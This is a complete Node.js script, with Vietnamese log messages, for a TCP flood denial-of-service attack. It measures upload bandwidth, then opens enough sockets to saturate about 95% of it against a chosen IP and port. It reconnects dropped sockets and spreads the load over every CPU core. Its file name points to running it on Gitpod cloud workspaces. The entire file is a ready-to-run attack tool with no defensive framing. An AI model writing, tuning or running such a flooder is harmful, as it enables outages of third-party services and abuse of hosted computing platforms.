const net = require('net');
const cluster = require('cluster');
const os = require('os');
const speedTest = require('speedtest-net');

async function getUploadMbps() {
    try {
        console.log(`[${process.pid}] ⏳ Đo băng thông upload...`);
        const result = await speedTest({ acceptLicense: true, acceptGdpr: true });
        const uploadMbps = result.upload.bandwidth * 8 / 1e6;
        console.log(`[${process.pid}] ✅ Upload: ${uploadMbps.toFixed(2)} Mbps`);
        return uploadMbps;
    } catch (e) {
        console.error(`[${process.pid}] ⚠️ Không đo được, dùng mặc định 3 Gbps`);
        return 3072;
    }
}

async function startFlood(ip, port, durationSec, usageRatio = 0.95) {
    const uploadMbps = await getUploadMbps();
    const totalBytesPerSec = ((uploadMbps * 1024 * 1024) / 8) * usageRatio;

    let chunkSize;
    if (uploadMbps <= 20) chunkSize = 1024;
    else if (uploadMbps <= 100) chunkSize = 4096;
    else if (uploadMbps <= 500) chunkSize = 8192;
    else chunkSize = 16384;

    const targetSocketSpeed = 20 * 1024;
    const socketCount = Math.floor(totalBytesPerSec / targetSocketSpeed);
    const delay = (chunkSize / targetSocketSpeed) * 1000;

    console.log(`[${process.pid}] 🚀 Flood ${ip}:${port} | Sockets: ${socketCount} | Chunk: ${chunkSize}B | Delay: ${delay.toFixed(2)}ms | Thời gian: ${durationSec}s`);

    const sockets = [];

    function floodConnection() {
        const socket = net.connect(port, ip, () => {
            const interval = setInterval(() => {
                try {
                    socket.write(Buffer.alloc(chunkSize));
                } catch {
                    clearInterval(interval);
                    socket.destroy();
                }
            }, delay);

            socket.on('error', () => {
                clearInterval(interval);
                socket.destroy();
                setTimeout(floodConnection, 200);
            });

            socket.on('close', () => {
                clearInterval(interval);
                setTimeout(floodConnection, 200);
            });

            sockets.push({ socket, interval });
        });
    }

    for (let i = 0; i < socketCount; i++) floodConnection();

    setTimeout(() => {
        console.log(`[${process.pid}] ⏹ Dừng sau ${durationSec}s`);
        sockets.forEach(({ socket, interval }) => {
            clearInterval(interval);
            socket.destroy();
        });
        process.exit(0);
    }, durationSec * 1000);
}

const [ip, portStr, timeStr] = process.argv.slice(2);
const port = parseInt(portStr);
const time = parseInt(timeStr);

if (!ip || !port || !time) {
    console.log('❗ Dùng: node tcp_flood_gitpod.js <ip> <port> <seconds>');
    process.exit(1);
}

if (cluster.isMaster) {
    const cores = os.cpus().length;
    console.log(`👑 Master PID ${process.pid} | Chạy ${cores} core Gitpod`);
    for (let i = 0; i < cores; i++) cluster.fork();
} else {
    startFlood(ip, port, time);
}
